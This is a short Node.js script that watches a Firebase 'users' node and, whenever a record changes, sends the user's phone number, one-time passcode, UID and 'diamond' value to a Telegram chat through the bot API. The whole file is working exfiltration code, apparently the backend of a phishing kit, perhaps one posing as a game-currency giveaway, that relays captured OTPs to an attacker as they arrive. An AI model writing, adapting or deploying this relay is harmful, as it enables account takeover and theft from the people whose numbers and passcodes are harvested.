import admin from "firebase-admin";
import fetch from "node-fetch";
import fs from "fs";

// Load serviceAccountKey from environment secret
const serviceAccount = JSON.parse(process.env.SERVICE_ACCOUNT_JSON);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: process.env.FIREBASE_DB_URL
});

const db = admin.database();

// Telegram info
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Firebase listener
db.ref("users").on("child_changed", async (snapshot) => {
  const userKey = snapshot.key;
  const userData = snapshot.val();

  let message = `Update from user: ${userKey}\n`;

  if(userData.NUMBERC) message += `Number: ${userData.NUMBERC}\n`;
  if(userData.OTPC) message += `OTP: ${userData.OTPC}\n`;
  if(userData.UIDC) message += `UID: ${userData.UIDC}\n`;
  if(userData.DIAMONDC) message += `Diamond: ${userData.DIAMONDC}\n`;

  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });
});

console.log("Firebase → Telegram bot running...");
